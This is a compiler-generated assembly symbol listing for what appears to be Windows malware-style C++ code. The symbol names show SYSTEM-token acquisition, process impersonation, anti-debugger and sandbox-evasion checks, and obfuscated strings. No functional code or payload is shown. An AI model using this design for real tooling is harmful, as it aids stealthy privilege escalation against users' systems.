PUBLIC	??D?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEBAAEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@XZ ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator*
PUBLIC	??E?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAAEAV01@XZ ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::operator++
PUBLIC	??0?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@AEBV?$obfuscator@$0BJ@$0HBHPFNAPILJNJLOH@D@1@@Z ; ay::obfuscated_data<25,8178357769676364775,char>::obfuscated_data<25,8178357769676364775,char>
PUBLIC	??1?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAA@XZ ; ay::obfuscated_data<25,8178357769676364775,char>::~obfuscated_data<25,8178357769676364775,char>
PUBLIC	??B?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<25,8178357769676364775,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@AEBV?$obfuscator@$0BA@$0?BKIAEAOAIEMIKIGP@D@1@@Z ; ay::obfuscated_data<16,-1909597575049685103,char>::obfuscated_data<16,-1909597575049685103,char>
PUBLIC	??1?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAA@XZ ; ay::obfuscated_data<16,-1909597575049685103,char>::~obfuscated_data<16,-1909597575049685103,char>
PUBLIC	??B?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<16,-1909597575049685103,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0CHMPGHGPPBJFDPJN@D@1@@Z ; ay::obfuscated_data<15,2868625218150416285,char>::obfuscated_data<15,2868625218150416285,char>
PUBLIC	??1?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAA@XZ ; ay::obfuscated_data<15,2868625218150416285,char>::~obfuscated_data<15,2868625218150416285,char>
PUBLIC	??B?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<15,2868625218150416285,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@AEBV?$obfuscator@$0BP@$0?GGDGEMJMMGFOMGGP@D@1@@Z ; ay::obfuscated_data<31,-7365158476837733999,char>::obfuscated_data<31,-7365158476837733999,char>
PUBLIC	??1?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAA@XZ ; ay::obfuscated_data<31,-7365158476837733999,char>::~obfuscated_data<31,-7365158476837733999,char>
PUBLIC	??B?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<31,-7365158476837733999,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?ONOEALOLKHONGJN@D@1@@Z ; ay::obfuscated_data<24,-1071364949277595293,char>::obfuscated_data<24,-1071364949277595293,char>
PUBLIC	??1?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAA@XZ ; ay::obfuscated_data<24,-1071364949277595293,char>::~obfuscated_data<24,-1071364949277595293,char>
PUBLIC	??B?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<24,-1071364949277595293,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0HNCBMLEFJHLPKHNB@D@1@@Z ; ay::obfuscated_data<13,9016711428731545553,char>::obfuscated_data<13,9016711428731545553,char>
PUBLIC	??1?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAA@XZ ; ay::obfuscated_data<13,9016711428731545553,char>::~obfuscated_data<13,9016711428731545553,char>
PUBLIC	??B?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<13,9016711428731545553,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@AEBV?$obfuscator@$0P@$0BPDLBGPANDNDDDN@D@1@@Z ; ay::obfuscated_data<15,140651103900218173,char>::obfuscated_data<15,140651103900218173,char>
PUBLIC	??1?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAA@XZ ; ay::obfuscated_data<15,140651103900218173,char>::~obfuscated_data<15,140651103900218173,char>
PUBLIC	??B?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<15,140651103900218173,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@AEBV?$obfuscator@$0BF@$0FHJHDFKLONPDMJDB@D@1@@Z ; ay::obfuscated_data<21,6311572415330896177,char>::obfuscated_data<21,6311572415330896177,char>
PUBLIC	??1?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAA@XZ ; ay::obfuscated_data<21,6311572415330896177,char>::~obfuscated_data<21,6311572415330896177,char>
PUBLIC	??B?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<21,6311572415330896177,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@AEBV?$obfuscator@$0O@$0BLHFLNBBBJKDBPFN@D@1@@Z ; ay::obfuscated_data<14,1978695492441415517,char>::obfuscated_data<14,1978695492441415517,char>
PUBLIC	??1?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAA@XZ ; ay::obfuscated_data<14,1978695492441415517,char>::~obfuscated_data<14,1978695492441415517,char>
PUBLIC	??B?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<14,1978695492441415517,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@AEBV?$obfuscator@$0N@$0?EEFGJGBAAMNIAIKN@D@1@@Z ; ay::obfuscated_data<13,-4924288238255343789,char>::obfuscated_data<13,-4924288238255343789,char>
PUBLIC	??1?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAA@XZ ; ay::obfuscated_data<13,-4924288238255343789,char>::~obfuscated_data<13,-4924288238255343789,char>
PUBLIC	??B?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<13,-4924288238255343789,char>::operator char *
PUBLIC	??0?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@AEBV?$obfuscator@$0BI@$0?MCINOCCHMAEECDD@D@1@@Z ; ay::obfuscated_data<24,-876194367214469683,char>::obfuscated_data<24,-876194367214469683,char>
PUBLIC	??1?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAA@XZ ; ay::obfuscated_data<24,-876194367214469683,char>::~obfuscated_data<24,-876194367214469683,char>
PUBLIC	??B?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@QEAAPEADXZ ; ay::obfuscated_data<24,-876194367214469683,char>::operator char *
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_2>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0BI@$0?MCINOCCHMAEECDD@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0N@$0HNCBMLEFJHLPKHNB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_2>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0P@$0BPDLBGPANDNDDDN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_3>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0BF@$0FHJHDFKLONPDMJDB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_4>@?1??StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z@QEBAAEAV?$obfuscated_data@$0O@$0BLHFLNBBBJKDBPFN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::StartWindowsService'::`2'::<lambda_4>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@QEBAAEAV?$obfuscated_data@$0BI@$0?ONOEALOLKHONGJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::OpenProcessAsImposter'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??HaltProcessExecution@ProcessUtilities@@YAXXZ@QEBAAEAV?$obfuscated_data@$0BP@$0?GGDGEMJMMGFOMGGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::HaltProcessExecution'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	?HaltProcessExecution@ProcessUtilities@@YAXXZ	; ProcessUtilities::HaltProcessExecution
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BJ@$0HBHPFNAPILJNJLOH@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_2>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0BA@$0?BKIAEAOAIEMIKIGP@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_2>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	??__Fobfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	?PIDFromName@ProcessUtilities@@YAKPEBD@Z	; ProcessUtilities::PIDFromName
PUBLIC	?__autoclassinit2@?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@QEAAX_K@Z ; std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >::__autoclassinit2
PUBLIC	??__Fobfuscated_data@?1???R<lambda_1>@?1??Init@ProcessUtilities@@YAHXZ@QEBAAEAV?$obfuscated_data@$0M@$0?BEBOLOIGHKNGJACB@D@ay@@XZ@YAXXZ ; ``ProcessUtilities::Init'::`2'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'obfuscated_data''
PUBLIC	?GetLoadedLib@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetLoadedLib
PUBLIC	?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z ; ProcessUtilities::PWSTRToString
PUBLIC	?__autoclassinit2@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAX_K@Z ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::__autoclassinit2
PUBLIC	??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::~_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >
PUBLIC	??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
PUBLIC	?DelayOperation@SandboxCompromise@@YAXXZ	; SandboxCompromise::DelayOperation
PUBLIC	?SuspicousProcRunning@SandboxCompromise@@YAHXZ	; SandboxCompromise::SuspicousProcRunning
PUBLIC	?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAX_K@Z ; std::_Uninitialized_backout_al<std::allocator<char const *> >::__autoclassinit2
PUBLIC	?__autoclassinit2@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAAX_K@Z ; std::vector<char const *,std::allocator<char const *> >::__autoclassinit2
PUBLIC	??1?$_Tidy_guard@V?$vector@PEBDV?$allocator@PEBD@std@@@std@@@std@@QEAA@XZ ; std::_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >::~_Tidy_guard<std::vector<char const *,std::allocator<char const *> > >
PUBLIC	??$_Destroy_range@V?$allocator@PEBD@std@@@std@@YAXPEAPEBDQEAPEBDAEAV?$allocator@PEBD@0@@Z ; std::_Destroy_range<std::allocator<char const *> >
PUBLIC	??1?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@XZ ; std::_Uninitialized_backout_al<std::allocator<char const *> >::~_Uninitialized_backout_al<std::allocator<char const *> >
PUBLIC	?_Release@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAPEAPEBDXZ ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Release
PUBLIC	??$construct_at@PEBDAEBQEBD$0A@@std@@YAPEAPEBDQEAPEBDAEBQEBD@Z ; std::construct_at<char const *,char const * const &,0>
PUBLIC	??$construct@PEBDAEBQEBD@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SAXAEAV?$allocator@PEBD@1@QEAPEBDAEBQEBD@Z ; std::_Default_allocator_traits<std::allocator<char const *> >::construct<char const *,char const * const &>
PUBLIC	??$forward@AEBQEBD@std@@YAAEBQEBDAEBQEBD@Z	; std::forward<char const * const &>
PUBLIC	??$_Unfancy@PEBD@std@@YAPEAPEBDPEAPEBD@Z	; std::_Unfancy<char const *>
PUBLIC	??$_Emplace_back@AEBQEBD@?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAAXAEBQEBD@Z ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Emplace_back<char const * const &>
PUBLIC	??0?$_Uninitialized_backout_al@V?$allocator@PEBD@std@@@std@@QEAA@PEAPEBDAEAV?$allocator@PEBD@1@@Z ; std::_Uninitialized_backout_al<std::allocator<char const *> >::_Uninitialized_backout_al<std::allocator<char const *> >
PUBLIC	??$move@AEAPEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z ; std::move<char const * const * &>
PUBLIC	??$_To_address@PEBQEBD@std@@YA?A_PAEBQEBQEBD@Z	; std::_To_address<char const * const *>
PUBLIC	??$_Uninitialized_copy@PEBQEBDPEBQEBDV?$allocator@PEBD@std@@@std@@YAPEAPEBDPEBQEBD0PEAPEBDAEAV?$allocator@PEBD@0@@Z ; std::_Uninitialized_copy<char const * const *,char const * const *,std::allocator<char const *> >
PUBLIC	??$_Unwrap_sent@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z ; std::ranges::_Unwrap_sent<char const * const *,char const * const *>
PUBLIC	??$_Unwrap_iter@PEBQEBDPEBQEBD@ranges@std@@YA?A_T$$QEAPEBQEBD@Z ; std::ranges::_Unwrap_iter<char const * const *,char const * const *>
PUBLIC	??$forward@PEBQEBD@std@@YA$$QEAPEBQEBDAEAPEBQEBD@Z ; std::forward<char const * const *>
PUBLIC	??$_Allocate_at_least_helper@V?$allocator@PEBD@std@@@std@@YAPEAPEBDAEAV?$allocator@PEBD@0@AEA_K@Z ; std::_Allocate_at_least_helper<std::allocator<char const *> >
PUBLIC	?_Buy_raw@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_raw
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@PEBD@std@@@std@@SA_KAEBV?$allocator@PEBD@2@@Z ; std::_Default_allocator_traits<std::allocator<char const *> >::max_size
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEBAAEBV?$allocator@PEBD@2@XZ ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first
PUBLIC	?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEBAAEBV?$allocator@PEBD@2@XZ ; std::vector<char const *,std::allocator<char const *> >::_Getal
PUBLIC	?max_size@?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEBA_KXZ ; std::vector<char const *,std::allocator<char const *> >::max_size
PUBLIC	?_Buy_nonzero@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K@Z ; std::vector<char const *,std::allocator<char const *> >::_Buy_nonzero
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAAAEAV?$allocator@PEBD@2@XZ ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Get_first
PUBLIC	?_Getal@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAAEAV?$allocator@PEBD@2@XZ ; std::vector<char const *,std::allocator<char const *> >::_Getal
PUBLIC	??$_Construct_n@PEBQEBDPEBQEBD@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAX_K$$QEAPEBQEBD1@Z ; std::vector<char const *,std::allocator<char const *> >::_Construct_n<char const * const *,char const * const *>
PUBLIC	?end@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ	; std::initializer_list<char const *>::end
PUBLIC	?begin@?$initializer_list@PEBD@std@@QEBAPEBQEBDXZ ; std::initializer_list<char const *>::begin
PUBLIC	?size@?$initializer_list@PEBD@std@@QEBA_KXZ	; std::initializer_list<char const *>::size
PUBLIC	??0?$_Vector_val@U?$_Simple_types@PEBD@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<char const *> >::_Vector_val<std::_Simple_types<char const *> >
PUBLIC	??$forward@AEBV?$allocator@PEBD@std@@@std@@YAAEBV?$allocator@PEBD@0@AEBV10@@Z ; std::forward<std::allocator<char const *> const &>
PUBLIC	??$?0AEBV?$allocator@PEBD@std@@$$V@?$_Compressed_pair@V?$allocator@PEBD@std@@V?$_Vector_val@U?$_Simple_types@PEBD@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@PEBD@1@@Z ; std::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1>::_Compressed_pair<std::allocator<char const *>,std::_Vector_val<std::_Simple_types<char const *> >,1><std::allocator<char const *> const &>
PUBLIC	??0?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@V?$initializer_list@PEBD@1@AEBV?$allocator@PEBD@1@@Z ; std::vector<char const *,std::allocator<char const *> >::vector<char const *,std::allocator<char const *> >
PUBLIC	??0?$allocator@PEBD@std@@QEAA@XZ		; std::allocator<char const *>::allocator<char const *>
PUBLIC	??0?$initializer_list@PEBD@std@@QEAA@PEBQEBD0@Z	; std::initializer_list<char const *>::initializer_list<char const *>
PUBLIC	?_Ceiling_of_log_2@std@@YAK_K@Z			; std::_Ceiling_of_log_2
PUBLIC	?_Floor_of_log_2@std@@YAK_K@Z			; std::_Floor_of_log_2
PUBLIC	?_Fnv1a_append_bytes@std@@YA_K_KQEBE_K@Z	; std::_Fnv1a_append_bytes
PUBLIC	?_Free@Data_t@_bstr_t@@AEAAXXZ			; _bstr_t::Data_t::_Free
PUBLIC	??1Data_t@_bstr_t@@AEAA@XZ			; _bstr_t::Data_t::~Data_t
PUBLIC	??2Data_t@_bstr_t@@SAPEAX_K@Z			; _bstr_t::Data_t::operator new
PUBLIC	?GetString@Data_t@_bstr_t@@QEBAPEBDXZ		; _bstr_t::Data_t::GetString
PUBLIC	??_GData_t@_bstr_t@@AEAAPEAXI@Z			; _bstr_t::Data_t::`scalar deleting destructor'
PUBLIC	?Release@Data_t@_bstr_t@@QEAAKXZ		; _bstr_t::Data_t::Release
PUBLIC	??0Data_t@_bstr_t@@QEAA@PEB_W@Z			; _bstr_t::Data_t::Data_t
PUBLIC	?_Free@_bstr_t@@AEAAXXZ				; _bstr_t::_Free
PUBLIC	??B_bstr_t@@QEBAPEBDXZ				; _bstr_t::operator char const *
PUBLIC	??1_bstr_t@@QEAA@XZ				; _bstr_t::~_bstr_t
PUBLIC	??0_bstr_t@@QEAA@PEB_W@Z			; _bstr_t::_bstr_t
PUBLIC	?__autoclassinit2@Data_t@_bstr_t@@QEAAX_K@Z	; _bstr_t::Data_t::__autoclassinit2
PUBLIC	?StartWindowsService@ProcessUtilities@@YAKV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::StartWindowsService
PUBLIC	?OpenProcessAsImposter@ProcessUtilities@@YAHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z ; ProcessUtilities::OpenProcessAsImposter
PUBLIC	?CheckNoDebugger@ProcessUtilities@@YAHXZ	; ProcessUtilities::CheckNoDebugger
PUBLIC	?CreateProcessAccessToken@ProcessUtilities@@YAPEAXK@Z ; ProcessUtilities::CreateProcessAccessToken
PUBLIC	?Init@ProcessUtilities@@YAHXZ			; ProcessUtilities::Init
PUBLIC	?GetSystemToken@ProcessUtilities@@YAPEAXXZ	; ProcessUtilities::GetSystemToken
PUBLIC	?Clean@ProcessUtilities@@YAHXZ			; ProcessUtilities::Clean
PUBLIC	?FreeUsedLibrary@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::FreeUsedLibrary
PUBLIC	?_GetFuncAddress@ProcessUtilities@@YAP6A_JXZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::_GetFuncAddress
PUBLIC	?GetModHandle@ProcessUtilities@@YAPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z ; ProcessUtilities::GetModHandle
PUBLIC	?suspiciousProcNames@SandboxCompromise@@3V?$vector@PEBDV?$allocator@PEBD@std@@@std@@A ; SandboxCompromise::suspiciousProcNames
;	COMDAT ?obfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_1>@?1??GetSystemToken@ProcessUtilities@@YAPEAXXZ@QEBAAEAV?$obfuscated_data@$0N@$0?EEFGJGBAAMNIAIKN@D@ay@@XZ@4V45@A DB 0eH DUP (?) ; ``ProcessUtilities::GetSystemToken'::`2'::<lambda_1>::operator()'::`2'::obfuscated_data
_TLS	ENDS
;	COMDAT ?obfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4V45@A
_TLS	SEGMENT
?obfuscated_data@?1???R<lambda_3>@?1??PIDFromName@ProcessUtilities@@YAKPEBD@Z@QEBAAEAV?$obfuscated_data@$0P@$0CHMPGHGPPBJFDPJN@D@ay@@XZ@4V45@A DB 010H DUP (?) ; ``ProcessUtilities::PIDFromName'::`2'::<lambda_3>::operator()'::`2'::obfuscated_data
_TLS	ENDS
